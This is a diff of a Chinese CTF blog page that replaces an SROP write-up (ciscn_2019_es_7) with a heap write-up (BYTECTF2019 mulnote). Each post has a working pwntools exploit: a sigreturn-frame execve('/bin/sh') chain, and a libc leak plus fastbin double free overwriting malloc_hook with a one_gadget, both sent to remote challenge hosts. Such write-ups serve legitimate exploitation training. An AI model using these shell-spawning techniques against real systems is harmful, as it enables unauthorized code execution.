@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="SROP，甚至比CTFWIKI上的例题简单。">
+<meta name="description" content="算是第一次在比赛时间里解出堆题？2333菜鸡只能做签到题了">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ciscn_2019_es_7">
-<meta property="og:url" content="http://yoursite.com/2019/08/02/ciscn-2019-es-7/index.html">
+<meta property="og:title" content="BYTECTF2019-mulnote">
+<meta property="og:url" content="http://yoursite.com/2019/09/09/BYTECTF2019-mulnote/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="SROP，甚至比CTFWIKI上的例题简单。">
+<meta property="og:description" content="算是第一次在比赛时间里解出堆题？2333菜鸡只能做签到题了">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-02T16:23:24.321Z">
+<meta property="og:updated_time" content="2019-09-09T08:38:47.377Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ciscn_2019_es_7">
-<meta name="twitter:description" content="SROP，甚至比CTFWIKI上的例题简单。">
+<meta name="twitter:title" content="BYTECTF2019-mulnote">
+<meta name="twitter:description" content="算是第一次在比赛时间里解出堆题？2333菜鸡只能做签到题了">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>ciscn_2019_es_7 | 4eriri&#39;s blog</title>
+<title>BYTECTF2019-mulnote | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -196,11 +196,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-ciscn-2019-es-7" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-BYTECTF2019-mulnote" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/08/02/ciscn-2019-es-7/" class="article-date">
-      <time datetime="2019-08-02T15:10:37.000Z" itemprop="datePublished">2019-08-02</time>
+      <a href="/2019/09/09/BYTECTF2019-mulnote/" class="article-date">
+      <time datetime="2019-09-09T06:58:58.000Z" itemprop="datePublished">2019-09-09</time>
 </a>
 
 
@@ -215,7 +215,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ciscn_2019_es_7
+      BYTECTF2019-mulnote
     </h1>
   
 
@@ -232,14 +232,12 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>SROP，甚至比CTFWIKI上的例题简单。</p>
+        <p>算是第一次在比赛时间里解出堆题？2333菜鸡只能做签到题了</p>
 <a id="more"></a>
-<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 30h        ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_write</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
-<p>调用syscall read&amp;write，之后直接retn。</p>
-<p>同时给了两个gadget，方便修改rax为相应的系统调用号。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, 0Fh   //constants.SYS_sigreturn</span><br><span class="line">retn </span><br><span class="line">mov     rax, 3Bh	  //constants.SYS_execve</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
-<p>CTFWIKI上的例题只给了read调用，write调用还需要自己巧妙构造，这里直接可以leak出stack地址，然后就照着CTFWIKI上的脚本稍微改一改就行了。也可以直接手动找gadgets把参数传好，然后利用<code>mov     rax, 3Bh        syscall</code>执行execve(“/bin/sh”,0,0)，不过感觉找gadgets比上CTFWIKI麻烦2333</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_7.dms&quot;)context.arch=&apos;amd64&apos;sh=remote(&quot;f.buuoj.cn&quot;,20179)syscall_ret=0x400517read=0x4004f1movrax_sigreturn=0x4004damovrax_system=0x4004E2sh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(read))sh.recv(32)stack_addr=u64(sh.recv(8))log.success(&quot;stack: &quot;+hex(stack_addr))sh.recv(8)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280  # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retsh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe))sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>感觉主要难点就是控制流平坦化吧，但是note的写法比较固定了，稍微猜一猜就猜出了程序的逻辑。</p>
+<p>unsorted bin leak出libc地址，然后double free拿malloc_hook，经常看见这样的题目。</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">def Create(size,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;C&quot;)</span><br><span class="line">	sh.recvuntil(&quot;size&gt;&quot;)</span><br><span class="line">	sh.sendline(str(int(size)))</span><br><span class="line">	sh.recvuntil(&quot;note&gt;&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def Edit(index,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;E&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index&gt;&quot;)</span><br><span class="line">	sh.sendline(index)</span><br><span class="line">	sh.recvuntil(&quot;note&gt;&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def Remove(index):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;R&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index&gt;&quot;)</span><br><span class="line">	sh.sendline(index)</span><br><span class="line">def Show():</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;S&quot;)</span><br><span class="line">def XB(index,size):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.send(&quot;XxXxBbBb&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index&quot;)</span><br><span class="line">	sh.sendline(index)</span><br><span class="line">	sh.recvuntil(&quot;new size&gt;size&gt;&quot;)</span><br><span class="line">	sh.sendline(str(int(size)))</span><br><span class="line"></span><br><span class="line">#sh=process(&quot;./mulnote&quot;)</span><br><span class="line">sh=remote(&quot;112.126.101.96&quot;,9999)</span><br><span class="line">Create(0x80,&quot;1&quot;)</span><br><span class="line">Create(16,&apos;2&apos;)</span><br><span class="line">Remove(&quot;0&quot;)</span><br><span class="line">Show()</span><br><span class="line">sh.recvuntil(&quot;note[0]:\n&quot;)</span><br><span class="line">leak=u64(sh.recv(6)+&apos;\x00\x00&apos;)</span><br><span class="line">malloc_hook=leak-88-0x10</span><br><span class="line">libcbase=leak-88-0x3C4B20</span><br><span class="line">log.success(&quot;malloc_hook: &quot;+hex(leak-88-0x10))</span><br><span class="line">Create(0x60,&apos;\x11&apos;)</span><br><span class="line">Create(0x60,&apos;\x22&apos;)</span><br><span class="line">Remove(&quot;2&quot;)</span><br><span class="line">Remove(&quot;3&quot;)</span><br><span class="line">Remove(&quot;2&quot;)</span><br><span class="line">Create(0x60,p64(malloc_hook-0x23))</span><br><span class="line">Create(0x60,p64(malloc_hook-0x23))</span><br><span class="line">Create(0x60,p64(malloc_hook-0x23))</span><br><span class="line">Create(0x60,&apos;\x00&apos;*19+p64(libcbase+onegadget[1]))</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;C&quot;)</span><br><span class="line">sh.recvuntil(&quot;size&gt;&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -247,13 +245,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/08/02/ciscn-2019-es-7/">ciscn_2019_es_7</a></p>
+        <p><span>本文标题:</span><a href="/2019/09/09/BYTECTF2019-mulnote/">BYTECTF2019-mulnote</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-08-02, 23:10:37</p>
-        <p><span>最后更新:</span>2019-08-03, 00:23:24</p>
+        <p><span>发布时间:</span>2019-09-09, 14:58:58</p>
+        <p><span>最后更新:</span>2019-09-09, 16:38:47</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/08/02/ciscn-2019-es-7/" title="ciscn_2019_es_7">http://yoursite.com/2019/08/02/ciscn-2019-es-7/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/02/ciscn-2019-es-7/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/09/09/BYTECTF2019-mulnote/" title="BYTECTF2019-mulnote">http://yoursite.com/2019/09/09/BYTECTF2019-mulnote/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/09/09/BYTECTF2019-mulnote/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -265,16 +263,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/08/03/ciscn-2019-es-4/">
-                    ciscn_2019_es_4
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/08/01/hacknote/">
-                    攻防世界-hacknote
+                <a href="/2019/08/19/SUCTF2019-playfmt/">
+                    SUCTF2019-playfmt
                 </a>
             </div>
         
@@ -286,7 +278,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#程序分析"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol>
+            
         
     </div>
     <style>
@@ -322,7 +314,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"ciscn_2019_es_7　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"BYTECTF2019-mulnote　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -341,8 +333,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/08/02/ciscn-2019-es-7/';
-            this.page.identifier = '2019/08/02/ciscn-2019-es-7/';
+            this.page.url = 'http://yoursite.com/2019/09/09/BYTECTF2019-mulnote/';
+            this.page.identifier = '2019/09/09/BYTECTF2019-mulnote/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -364,15 +356,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/08/03/ciscn-2019-es-4/" title="上一篇: ciscn_2019_es_4">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/08/01/hacknote/" title="下一篇: 攻防世界-hacknote">
+            <a href="/2019/08/19/SUCTF2019-playfmt/" title="下一篇: SUCTF2019-playfmt">
                 <i class="fa fa-angle-right"></i>
             </a>
         
